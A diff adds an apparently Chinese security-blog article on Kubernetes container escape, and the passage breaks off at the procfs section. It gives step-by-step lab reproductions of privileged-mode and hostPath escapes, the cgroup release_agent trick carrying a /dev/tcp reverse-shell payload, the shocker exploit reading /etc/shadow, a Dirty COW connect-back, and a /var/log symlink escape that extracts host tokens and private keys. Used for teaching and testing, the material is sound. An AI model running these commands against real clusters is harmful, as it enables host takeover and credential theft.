@@ -1,0 +1,867 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="609d25b6a07a4fb9e4dbe548f1db735b">文章前言</h2>
+<p>本篇文章是填补之前"K8s集群安全攻防(上)"挖的坑，主要补充K8s的逃逸、横向移动、权限维持、扩展技巧等内容</p>
+<h2 data-content="1" id="0d8e9c902f2324f251bd4514e23da0c3">逃逸相关</h2>
+<h3 data-content="1" id="90667b3bf80dd0a19f86f133acff1d7c">配置不当</h3>
+<h4 data-content="1" id="1b448a6c012067488a076f635b65cb53">Privileged特权模式逃逸</h4>
+<h5 data-content="1" id="f84743966f7f4c39cc00f926e75ecd17">前置知识</h5>
+<p>Security Context(安全上下文)，用于定义Pod或Container的权限和访问控制，Kubernetes提供了三种配置Security Context的方法：</p>
+<ul>
+<li>Pod Security Policy：应用于集群级别</li>
+<li>Pod-level Security Context：应用于Pod级别</li>
+<li>Container-level Security Context：应用于容器级别</li>
+</ul>
+<p>容器级别：仅应用到指定的容器上，并且不会影响Volume</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">apiVersion</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">v1</span>
+<span class="l l-Scalar l-Scalar-Plain">kind</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Pod</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">hello-world</span>
+<span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">containers</span><span class="p p-Indicator">:</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">hello-world-container</span>
+      <span class="l l-Scalar l-Scalar-Plain">image</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">ubuntu:latest</span>
+      <span class="l l-Scalar l-Scalar-Plain">securityContext</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">privileged</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+</pre></div>
+<p>Pod级别：应用到Pod内所有容器，会影响Volume</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">apiVersion</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">v1</span>
+<span class="l l-Scalar l-Scalar-Plain">kind</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Pod</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">hello-world</span>
+<span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">containers</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">securityContext</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">fsGroup</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">1234</span>
+    <span class="l l-Scalar l-Scalar-Plain">supplementalGroups</span><span class="p p-Indicator">:</span> <span class="p p-Indicator">[</span><span class="nv">5678</span><span class="p p-Indicator">]</span>
+    <span class="l l-Scalar l-Scalar-Plain">seLinuxOptions</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">level</span><span class="p p-Indicator">:</span> <span class="s">"s0:c123,c456"</span>
+</pre></div>
+<p>PSP，集群级别：PSP是集群级的Pod安全策略，自动为集群内的Pod和Volume设置Security Context<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027132824-a6153f30-7489-1.png"/></p>
+<h5 data-content="1" id="80bd94279ccf6f1b92295eb0da576143">漏洞介绍</h5>
+<p>当容器启动加上--privileged选项时，容器可以访问宿主机上所有设备，而K8s配置文件如果启用了"privileged: true"也可以实现挂载操作</p>
+<h5 data-content="1" id="ca740febd8bd16b8d249002d03061627">逃逸演示</h5>
+<p>Step 1：使用docker拉取ubuntu镜像到本地</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">sudo docker pull ubuntu</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133008-e44a9098-7489-1.png"/><br/>
+Step 2：创建一个Pod的yaml文件</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">apiVersion</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">v1</span>
+<span class="l l-Scalar l-Scalar-Plain">kind</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Pod</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">myapp-test</span>
+<span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">containers</span><span class="p p-Indicator">:</span>
+  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">image</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">ubuntu:latest</span>
+    <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">ubuntu</span>
+    <span class="l l-Scalar l-Scalar-Plain">securityContext</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">privileged</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133148-1ff4a17e-748a-1.png"/><br/>
+Step 3：创建一个Pod</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl create -f myapp-test.yaml</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133242-400f5b48-748a-1.png"/><br/>
+Step 3：进入Pod进行逃逸操作</p>
+<div class="highlight"><pre><span></span><span class="c1">#进入pod</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl exec -it myapp-test /bin/bash</span>
+
+<span class="l l-Scalar l-Scalar-Plain">#查看磁盘</span>
+<span class="l l-Scalar l-Scalar-Plain">fdisk -l</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133307-4f08ba54-748a-1.png"/><br/>
+Step 4：查看权限</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">cat /proc/self/status | grep CapEff</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133331-5d0c4e9a-748a-1.png"/><br/>
+Step 5：使用CDK进行逃逸</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">./cdk run mount-disk</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133355-6b561fc6-748a-1.png"/><br/>
+在容器内部进入挂载目录，直接管理宿主机磁盘文件(多少有一些问题)<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133417-78f9e41e-748a-1.png"/></p>
+<h4 data-content="1" id="d6b9067b92de978f188ef9c809df9bc2">CAP_SYS_ADMIN配置逃逸</h4>
+<h5 data-content="1" id="2ec1a8efcc169c9e09cadb19ea1bd604">漏洞概述</h5>
+<p>Docker通过Linux Namespace实现6项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯，但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限：</p>
+<ul>
+<li>--pid=host                                  启动时，绕过PID Namespace</li>
+<li>--ipc=host                                  启动时，绕过IPC Namespace</li>
+<li>--net=host                                  启动时，绕过Network Namespace</li>
+<li>--cap-add=SYS_ADMIN            启动时，允许执行mount特权操作，需获得资源挂载进行利用</li>
+</ul>
+<h5 data-content="1" id="83732aeea9307eeb9c09ab4d1b930bdc">利用前提</h5>
+<ul>
+<li>在容器内root用户</li>
+<li>容器必须使用SYS_ADMIN Linux capability运行</li>
+<li>容器必须缺少AppArmor配置文件，否则将允许mount syscall</li>
+<li>cgroup v1虚拟文件系统必须以读写方式安装在容器内部</li>
+</ul>
+<h5 data-content="1" id="3ff5a11bd62a1dd483c5010a5a900d6b">前置知识</h5>
+<p><strong>cgroup</strong><br/>
+默认情况下容器在启动时会在/sys/fs/cgroup目录各个subsystem目录的docker子目录里生成以容器ID为名字的子目录，我们通过执行以下命令查看宿主机里的memory cgroup目录，可以看到docker目录里多了一个目录9d14bc4987d5807f691b988464e167653603b13faf805a559c8a08cb36e3251a，这一串字符是容器ID，这个目录里的内容就是用户在容器里查看/sys/fs/cgroup/memory的内容<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133631-c85a08fe-748a-1.png"/><br/>
+<strong>mount</strong><br/>
+mount命令是一个系统调用(syscall)命令，系统调用号为165，执行syscall需要用户具备CAP_SYS_ADMIN的Capability，如果在宿主机启动时添加了--cap-add SYS_ADMIN参数，那root用户就能在容器内部就能执行mount挂载cgroup，docker默认情况下不会开启SYS_ADMIN Capability</p>
+<h5 data-content="1" id="ebec8690dc2f681793cf511749aad2fb">漏洞利用</h5>
+<p>漏洞利用的第一步是在容器里创建一个临时目录/tmp/cgrp并使用mount命令将系统默认的memory类型的cgroup重新挂载到/tmp/cgrp上</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp</span>
+</pre></div>
+<p>参数解释：</p>
+<ul>
+<li>-t参数：表示mount的类别为cgroup</li>
+<li>-o参数：表示挂载的选项，对于cgroup，挂载选项就是cgroup的subsystem，每个subsystem代表一种资源类型，比如：cpu、memory<br/>
+执行该命令之后，宿主机的memory cgroup被挂载到了容器中，对应目录/tmp/cgrp</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133725-e9113e82-748a-1.png"/><br/>
+需要注意的是在对cgroup进行重新挂载的操作时只有当被挂载目标的hierarchy为空时才能成功，因此如果这里memory的重新挂载不成功的话可以换其他的subsystem，接着就是在这个cgroup类型里建一个子目录x</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">mkdir /tmp/cgrp/x</span>
+</pre></div>
+<p>漏洞利用的第二步和notify_no_release有关，cgroup的每一个subsystem都有参数notify_on_release，这个参数值是Boolean型，1或0，分别可以启动和禁用释放代理的指令，如果notify_on_release启用当cgroup不再包含任何任务时(即cgroup的tasks文件里的PID为空时)，系统内核会执行release_agent参数指定的文件里的文本内容，不过需要注意的是release_agent文件并不在/tmp/cgrp/x目录里，而是在memory cgroup的根目录/tmp/cgrp里，这样的设计可以用来自动移除根cgroup里所有空的cgroup，我们可以通过执行以下命令将/tmp/cgrp/x的notify_no_release属性设置为1</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">echo 1 &gt; /tmp/cgrp/x/notify_no_release</span>
+</pre></div>
+<p>接着通过将release_agent指定为容器在宿主机上的cmd文件，具体操作是先获取docker容器在宿主机上的存储路径：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`</span>
+</pre></div>
+<p>文件/etc/mtab存储了容器中实际挂载的文件系统<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133829-0edbbd22-748b-1.png"/><br/>
+这里使用sed命令匹配perdir=(和)之间的非逗号内容，从上图可以看出，host_path就是docker的overlay存储驱动上的可写目录upperdir<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133858-20555cac-748b-1.png"/><br/>
+在这个目录里创建一个cmd文件，并把它作为/tmp/cgrp/x/release_agent参数指定的文件：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</span>
+</pre></div>
+<p>接下来POC将要执行的shell写到cmd文件里，并赋予执行权限</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">echo '#!/bin/sh' &gt; /cmd</span>
+<span class="l l-Scalar l-Scalar-Plain">echo "sh -i &gt;&amp; /dev/tcp/10.0.0.1/8443 0&gt;&amp;1" &gt;&gt; /cmd</span>
+<span class="l l-Scalar l-Scalar-Plain">chmod a+x /cmd</span>
+</pre></div>
+<p>最后POC触发宿主机执行cmd文件中的shell</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</span>
+</pre></div>
+<p>该命令启动一个sh进程，将sh进程的PID写入到/tmp/cgrp/x/cgroup.procs里，这里的\$\$表示sh进程的PID，在执行完sh -c之后，sh进程自动退出，这样cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release_agent文件里的shell将被操作系统内核执行<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027133935-3631cb5a-748b-1.png"/></p>
+<h4 data-content="1" id="85e87d16f8d304f86121ac66f7fdbc53">CAP_DAC_READ_SEARCH</h4>
+<h5 data-content="1" id="33f361f58cdbfeb879abe769b3472b02">影响范围</h5>
+<p>Docker 1.0</p>
+<h5 data-content="1" id="a7861e2681cabeb479102ac4d93577b6">场景描述</h5>
+<p>在早期的docker中容器内是默认拥有CAP_DAC_READ_SEARCH的权限的，拥有该Capability权限之后，容器内进程可以使用open_by_handle_at函数对宿主机文件系统暴力扫描，以获取宿主机的目标文件内容，Docker1.0之前对容器能力(Capability)使用黑名单策略管理，并未限制CAP_DAC_READ_SEARCH能力，故而赋予了shocker.c程序调用open_by_handle_at函数的能力，导致容器逃逸的发生</p>
+<h5 data-content="1" id="9a726e7d3480335723695281f21136b6">环境构建</h5>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">./metarget gadget install docker --version 18.03.1</span>
+<span class="l l-Scalar l-Scalar-Plain">./metarget gadget install k8s --version 1.16.5 --domestic</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027134108-6dfce90c-748b-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">./metarget cnv install cap_dac_read_search-container</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027134130-7ade5bba-748b-1.png"/><br/>
+备注：此场景较为简单可以直接使用Docker手动搭建，默认存在漏洞的Docker版本过于久远，但是复现漏洞可以使用任意版本的Docker，只需要在启动Docker时通过--cap-add选项来添加CAP_DAC_READ_SEARCH capability的权限即可</p>
+<h5 data-content="1" id="853f2af86688f3c694af2b31d1cd55af">漏洞复现</h5>
+<p>Step 1：查看容器列表可以发现此时有一个名为cap-dac-read-search-container的带有CAP_DAC_READ_SEARCH权限的容器</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">docker ps -a | grep cap</span>
+<span class="l l-Scalar l-Scalar-Plain">docker top 5713dea</span>
+<span class="l l-Scalar l-Scalar-Plain">getpcaps 51776</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027134236-a210243e-748b-1.png"/><br/>
+Step 2：下载poc文件并修改shocker.c中.dockerinit文件为 /etc/hosts</p>
+<div class="highlight"><pre><span></span><span class="c1">#初始文件</span>
+<span class="l l-Scalar l-Scalar-Plain">// get a FS reference from something mounted in from outside</span>
+<span class="l l-Scalar l-Scalar-Plain">if ((fd1 = open("/.dockerinit", O_RDONLY)) &lt; 0)</span>
+  <span class="l l-Scalar l-Scalar-Plain">die("[-] open");</span>
+
+<span class="l l-Scalar l-Scalar-Plain">#更改文件</span>
+<span class="l l-Scalar l-Scalar-Plain">// 由于文件需要和宿主机在同一个挂载的文件系统下，而高版本的.dockerinit已经不在宿主机的文件系统下了</span>
+<span class="l l-Scalar l-Scalar-Plain">// 但是/etc/resolv.conf,/etc/hostname,/etc/hosts等文件仍然是从宿主机直接挂载的，属于宿主机的文件系统</span>
+<span class="l l-Scalar l-Scalar-Plain">if ((fd1 = open("/etc/hosts", O_RDONLY)) &lt; 0)</span>
+  <span class="l l-Scalar l-Scalar-Plain">die("[-] open");</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027134258-af92e6b4-748b-1.png"/><br/>
+Step 3：编译shock.c文件</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">gcc shocker.c -o shocker</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027134320-bc7e4efe-748b-1.png"/><br/>
+Step 4：docker cp到容器内运行后成功访问到了宿主机的/etc/shadow文件</p>
+<div class="highlight"><pre><span></span><span class="c1">#基本格式</span>
+<span class="l l-Scalar l-Scalar-Plain">docker cp 本地路径 容器ID:容器路径</span>
+
+<span class="l l-Scalar l-Scalar-Plain">#使用实例</span>
+<span class="l l-Scalar l-Scalar-Plain">docker cp /home/ubuntu/shocker 5713dea8ce4b:/tmp/shocker</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027134348-cd12a3a0-748b-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027134358-d349a9f8-748b-1.png"/></p>
+<h3 data-content="1" id="fba7c8132de09fca9c12345f1d863c0b">内核漏洞</h3>
+<p>内核漏洞由很多都可以利用，例如：</p>
+<ul>
+<li>CVE-2016-5195:脏牛漏洞逃逸</li>
+<li>CVE-2017-7308:Linux内核逃逸</li>
+<li>CVE-2017-1000112:Linux内核逃逸</li>
+<li>CVE-2021-22555:Linux内核逃逸</li>
+<li>CVE-2021-31440:Linux eBPF</li>
+<li>CVE-2022-0185:Linux Kernel Escape</li>
+</ul>
+<p>下面仅以脏牛漏洞逃逸为例：</p>
+<h4 data-content="1" id="2e8c733e5803a504298dfdbd58723d3f">影响范围</h4>
+<p>Linux kernel 2.x through 4.x before 4.8.3</p>
+<h4 data-content="1" id="a449b79ce263b278f96667deba73a596">漏洞描述</h4>
+<p>Dirty Cow(CVE-2016-5195)是Linux内核中的权限提升漏洞，通过它可实现Docker容器逃逸，获得root权限的shell，需要注意的是Docker与宿主机共享内核，因此容器需要在存在dirtyCow漏洞的宿主机里运行</p>
+<h4 data-content="1" id="7653d4548b858ac0f09a88c1f3707799">漏洞复现</h4>
+<p>Step 1：测试环境下载</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">git clone https://github.com/gebl/dirtycow-docker-vdso.git</span>
+</pre></div>
+<p>Step 2：运行测试容器</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">cd dirtycow-docker-vdso/</span>
+<span class="l l-Scalar l-Scalar-Plain">sudo docker-compose run dirtycow /bin/bash</span>
+</pre></div>
+<p>Step 3：进入容器编译POC并执行</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">cd /dirtycow-vdso/</span>
+<span class="l l-Scalar l-Scalar-Plain">make</span>
+<span class="l l-Scalar l-Scalar-Plain">./0xdeadbeef 192.168.172.136:1234</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027140130-45db501e-748e-1.png"/><br/>
+Step 4：在192.168.172.136监听本地端口，成功接收到宿主机反弹的shell</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027140145-4f3f6fd2-748e-1.png"/><br/>
+这里留一个常被用于面试的问题给大家思考：<br/>
+为什么内核漏洞可以导致容器逃逸？基本原理是什么？</p>
+<h3 data-content="1" id="8deddd4dba7d20eed3517961bba4ffc7">危险挂载</h3>
+<h4 data-content="1" id="a0807d5dfbb6d987287efdee8416f00e">HostPath目录挂载</h4>
+<h5 data-content="1" id="10474f10385539fc49b87778e728a491">场景描述</h5>
+<p>由于用户使用较为危险的挂载将物理机的路径挂载到了容器内，从而导致逃逸</p>
+<h5 data-content="1" id="d110869b4993b5e29314b71af2fcf166">具体实现</h5>
+<p>Step 1：查看当前权限确定该容器具有主机系统的完整权限<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027140722-17a4a294-748f-1.png"/><br/>
+Step 2：发现/host-system从主机系统安装</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">ls -al</span>
+<span class="l l-Scalar l-Scalar-Plain">ls /host-system/</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027140749-2832f46c-748f-1.png"/><br/>
+Step 3：获得主机系统权限</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">chroot /host-system bash</span>
+<span class="l l-Scalar l-Scalar-Plain">docker ps</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027140807-32a372be-748f-1.png"/><br/>
+Step 4：访问节点级别Kubernetes的kubelet配置</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">cat /var/lib/kubelet/kubeconfig</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027140825-3d9f1fe2-748f-1.png"/><br/>
+Step 5：使用kubelet配置执行Kubernetes集群范围的资源</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027140849-4b8457c6-748f-1.png"/></p>
+<h4 data-content="1" id="8bf2dfc7f55c33618ec160d7db35ca72">/var/log危险挂载</h4>
+<h5 data-content="1" id="41858a98872be290eeb83b35f2dd94ae">场景介绍</h5>
+<p>当Pod以可写权限挂载了宿主机的/var/log目录，而且Pod里的Service Account有权限访问该Pod在宿主机上的日志时，攻击者可以通过在容器内创建符号链接来完成简单逃逸，简单归纳总结如下：</p>
+<ul>
+<li>挂载了/var/log</li>
+<li>容器在一个K8s的环境中</li>
+<li>Pod的ServiceAccount拥有get|list|watch log的权限</li>
+</ul>
+<h5 data-content="1" id="574227e04ef0632cdf449fb7dfc91acf">原理简介</h5>
+<p>下图展示了kubectl logs &lt;pod-name&gt; 如何从pod中检索日志&lt;/pod-name&gt;</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027140935-67148d62-748f-1.png"/><br/>
+kubelet会在宿主机上的/var/log目录中创建一个目录结构，如图符号1，代表节点上的pod，但它实际上是一个符号链接，指向/var/lib/docker/containers目录中的容器日志文件，当使用kubectl logs &lt;pod-name&gt;命令查询指定pod的日志时，实际上是向kubelet的/logs/pods/&lt;path_to_0.log&gt;接口发起HTTP请求，对于该请求的处理逻辑如下&lt;/pod-name&gt;</p>
+<div class="highlight"><pre><span></span><span class="c1">#kubernetes\pkg\kubelet\kubelet.go:1371</span>
+<span class="l l-Scalar l-Scalar-Plain">if kl.logServer == nil {</span>
+        <span class="l l-Scalar l-Scalar-Plain">kl.logServer = http.StripPrefix("/logs/", http.FileServer(http.Dir("/var/log/")))</span>
+<span class="l l-Scalar l-Scalar-Plain">}</span>
+</pre></div>
+<p>kubelet会解析该请求地址去/var/log对应的目录下读取log文件并返回，当pod以可写权限挂载了宿主机上的/var/log目录时，可以在该路径下创建一个符号链接指向宿主机的根目录，然后构造包含该符号链接的恶意kubelet请求，宿主机在解析时会解析该符号链接，导致可以读取宿主机任意文件和目录</p>
+<h5 data-content="1" id="00b4dc52a979507ff5ea22be2795d45e">环境搭建</h5>
+<div class="highlight"><pre><span></span><span class="c1">#基础环境</span>
+<span class="l l-Scalar l-Scalar-Plain">./metarget gadget install docker --version 18.03.1</span>
+<span class="l l-Scalar l-Scalar-Plain">./metarget gadget install k8s --version 1.16.5 --domestic</span>
+
+<span class="l l-Scalar l-Scalar-Plain">#漏洞环境</span>
+<span class="l l-Scalar l-Scalar-Plain">./metarget cnv install mount-var-log</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027141145-b4bdc3b2-748f-1.png"/><br/>
+执行完成后，K8s集群内metarget命令空间下将会创建一个名为mount-var-log的pod</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027141200-bd74e058-748f-1.png"/></p>
+<h5 data-content="1" id="14b2f7be54291ef32bf2325715086485">漏洞复现</h5>
+<p>Step 1：执行以下命令进入容器</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl -n metarget exec -it mount-var-log  /bin/bash</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027141231-d019e546-748f-1.png"/><br/>
+Step 2：查看文件，Pod内可执行以下两种命令</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">lsh     等于宿主机上的ls</span>
+<span class="l l-Scalar l-Scalar-Plain">cath    等于宿主机上的cat</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027141301-e1fd749e-748f-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027141309-e6c96cf8-748f-1.png"/></p>
+<h5 data-content="1" id="6a3774e2cc6f127944a07e8f660d361c">敏感文件</h5>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">$ kubectl exec -it escaper bash</span>
+<span class="l l-Scalar l-Scalar-Plain">➜ root@escaper:~/exploit$ python find_sensitive_files.py</span>
+<span class="l l-Scalar l-Scalar-Plain">[*] Got access to kubelet /logs endpoint</span>
+<span class="l l-Scalar l-Scalar-Plain">[+] creating symlink to host root folder inside /var/log</span>
+
+<span class="l l-Scalar l-Scalar-Plain">[*] fetching token files from host</span>
+<span class="l l-Scalar l-Scalar-Plain">[+] extracted hostfile</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/var/lib/kubelet/pods/6d67bed2-abe3-11e9-9888-42010a8e020e/volumes/kubernetes.io~secret/metadata-agent-token-xjfh9/token</span>
+
+<span class="p p-Indicator">[</span><span class="err">*</span><span class="p p-Indicator">]</span> <span class="l l-Scalar l-Scalar-Plain">fetching private key files from host</span>
+<span class="p p-Indicator">[</span><span class="nv">+</span><span class="p p-Indicator">]</span> <span class="l l-Scalar l-Scalar-Plain">extracted hostfile</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/home/ubuntu/.ssh/private.key</span>
+<span class="p p-Indicator">[</span><span class="nv">+</span><span class="p p-Indicator">]</span> <span class="l l-Scalar l-Scalar-Plain">extracted hostfile</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/etc/srv/kubernetes/pki/kubelet.key</span>
+<span class="nn">...</span>
+</pre></div>
+<p>之后会下载对应的敏感文件到以下位置：</p>
+<div class="highlight"><pre><span></span><span class="c1">#Token Files</span>
+<span class="l l-Scalar l-Scalar-Plain">/root/exploit/host_files/tokens</span>
+
+<span class="l l-Scalar l-Scalar-Plain">#Key Files</span>
+<span class="l l-Scalar l-Scalar-Plain">/root/exploit/host_files/private_keys</span>
+</pre></div>
+<h5 data-content="1" id="a8b0a0ce16f7c91dc3cae7b8c6cd3799">漏洞EXP</h5>
+<p><a href="https://github.com/danielsagi/kube-pod-escape" target="_blank">https://github.com/danielsagi/kube-pod-escape</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027141408-09c0657c-7490-1.png"/></p>
+<h4 data-content="1" id="557d102732045f5a342c89fd76848c28">Procfs目录逃逸类</h4>
+<h5 data-content="1" id="de1cce7f54a9ee488ca0398d99967380">场景介绍</h5>
+<p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件，因此将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时(Docker默认情况下不会为容器开启User Namespace)，一般来说我们不会将宿主机的procfs挂载到容器中，然而有些业务为了实现某些特殊需要，还是会将该文件系统挂载进来，procfs中的/proc/sys/kernel/core_pattern负责配置进程崩溃时内存转储数据的导出方式，从2.6.19内核版本开始Linux支持在/proc/sys/kernel/core_pattern中使用新语法，如果该文件中的首个字符是管道符|，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行</p>
+<h5 data-content="1" id="b83cc644fffca13db69173819211cf34">环境搭建</h5>
+<p>基础环境构建：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">./metarget gadget install docker --version 18.03.1</span>
+<span class="l l-Scalar l-Scalar-Plain">./metarget gadget install k8s --version 1.16.5 --domestic</span>
+</pre></div>
+<p>漏洞环境准备：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">./metarget cnv install mount-host-procfs</span>
+</pre></div>
+<p>执行完成后K8s集群内metarget命令空间下将会创建一个名为mount-host-procfs的pod，宿主机的procfs在容器内部的挂载路径是/host-proc</p>
+<h5 data-content="1" id="0c3c04d4786580e2f2e379926ac02886">漏洞复现</h5>
+<p>执行以下命令进入容器：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl exec -it -n metarget mount-host-procfs /bin/bash</span>
+</pre></div>
